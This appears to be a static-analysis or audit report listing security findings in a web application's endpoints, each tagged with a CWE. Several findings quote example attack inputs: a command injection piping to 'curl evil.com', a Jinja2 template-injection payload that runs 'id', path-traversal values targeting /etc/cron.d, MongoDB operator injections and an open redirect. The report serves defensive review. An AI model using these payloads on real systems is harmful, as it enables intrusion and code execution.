extra.message: User-controlled 'host' query parameter is concatenated directly into an os.system() call via 'ping -c 1 ' + host. This allows arbitrary OS command injection. An attacker can execute arbitrary system commands by passing a value like '127.0.0.1; whoami' or '127.0.0.1 | curl evil.com'.

cwe: CWE-78: OS Command Injection

extra.message: User-controlled 'card' query parameter is passed directly into a Jinja2 Template constructor with the '|safe' filter. This allows Server-Side Template Injection (SSTI), which can lead to remote code execution. An attacker can inject Jinja2 template syntax like '{{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}'.

cwe: CWE-1336: Server-Side Template Injection
CWE-94: Code Injection

extra.message: User-controlled 'fragment' query parameter is concatenated into a Jinja2 Template string before rendering. This allows Server-Side Template Injection (SSTI), which can lead to remote code execution. An attacker can inject Jinja2 template syntax like '{{ ()|attr(\'__class__\') }}' to execute arbitrary code.

cwe: CWE-1336: Server-Side Template Injection
CWE-94: Code Injection

extra.message: XML parser is configured with load_dtd=True, resolve_entities=True, and no_network=False. This enables XXE (XML External Entity) attacks, allowing an attacker to read local files (e.g., /etc/passwd), perform SSRF, or cause denial of service via entity expansion. User-supplied data is parsed via request.body() without sanitization.

cwe: CWE-611: XML External Entity (XXE) Injection

extra.message: User-controlled 'packet_ref' query parameter is used directly as a file path: incoming_dir / packet_ref. An attacker can use '../' sequences to write files to arbitrary locations on the filesystem (path traversal). For example, packet_ref='../../etc/cron.d/malicious' would allow writing to /etc/cron.d/.

cwe: CWE-22: Path Traversal

extra.message: User-controlled 'name' query parameter is used directly as a file path: BASE_EXPORT_DIR / name. An attacker can use '../' sequences to write files to arbitrary locations on the filesystem (path traversal). For example, name='../../etc/cron.d/malicious' would write to /etc/cron.d/.

cwe: CWE-22: Path Traversal

extra.message: User-supplied JSON payload is passed directly as a MongoDB query filter without sanitization: find_one(query). An attacker can inject MongoDB operators like {'$ne': ''}, {'$regex': '.*'}, or {'$where': 'sleep(5000)'} to bypass authentication, extract data via boolean-based inference, or perform denial of service.

cwe: CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL Injection)

extra.message: User-controlled 'lane' query parameter is passed directly to RedirectResponse(lane) without validation. This is an open redirect vulnerability (CWE-601). An attacker can craft a URL like '/ops/after/seller-lane-158?lane=https://evil.com' to redirect users to malicious sites.

cwe: CWE-601: Open Redirect

extra.message: Endpoint /fold/seller-payout-fold-084 has NO authentication dependency (missing gate_ref=Depends(_wrk_gate)). It exposes sensitive operational data including 'ops_memo' containing 'renewal risk, payment flags, owner contact details'. Unlike every other endpoint on this router, this one is fully public.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: Endpoint /origin/seller-mirror-570 reflects the 'Origin' request header back into the 'Access-Control-Allow-Origin' response header and also sets 'Access-Control-Allow-Credentials: true'. This effectively allows any external website to make credentialed cross-origin requests, completely defeating the Same-Origin Policy.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: The password reset endpoint returns the actual reset token in the response body as 'mock_reset_token'. This exposes the token to anyone who observes the HTTP response (network interceptors, browser dev tools, server logs). With the token, an attacker can reset the user's password without needing access to their email.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: Endpoint /wire/seller-tally-225 logs the full request body AND the Authorization header (containing the bearer token) to the application logs. This leaks sensitive credentials into log files which may be accessible to unauthorized personnel or attackers.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: Secret key falls back to a hardcoded value 'local-dev-secret-change-me' when APP_SECRET_KEY environment variable is not set. If deployed without setting this environment variable, the same well-known key is used for HMAC token hashing across all instances, allowing session forgery and CSRF token prediction.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: Session and CSRF cookies are set with 'secure=settings.cookie_secure' which defaults to False. Without the Secure flag, cookies are transmitted over unencrypted HTTP connections, making them vulnerable to network eavesdropping and session hijacking.

cwe: CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

extra.message: User-controlled input is hashed using MD5 (hashlib.md5), which is a cryptographically broken hash algorithm. MD5 is vulnerable to collision attacks and should not be used for any security-sensitive purpose. An attacker can craft collisions or use rainbow tables depending on context.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: User-supplied JSON payload is merged into a mutable dict via workset.update(payload) without validating allowed keys. An attacker can override internal fields such as 'approved', 'balance', 'role', or 'tier' to escalate privileges or manipulate business logic.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: CSV export function writes user-controlled data (product titles, descriptions, names, etc.) directly into CSV cells without sanitizing cells that start with '=', '+', '-', or '@'. When the CSV is opened in Excel or LibreOffice, these cells are interpreted as Dynamic Data Exchange (DDE) formulas, leading to potential remote code execution (CWE-1236).

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: Nonce generation uses random.choice (from Python's random module) instead of secrets.choice. The random module uses Mersenne Twister, which is predictable and not cryptographically secure. An attacker who observes multiple nonces can predict future values.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator
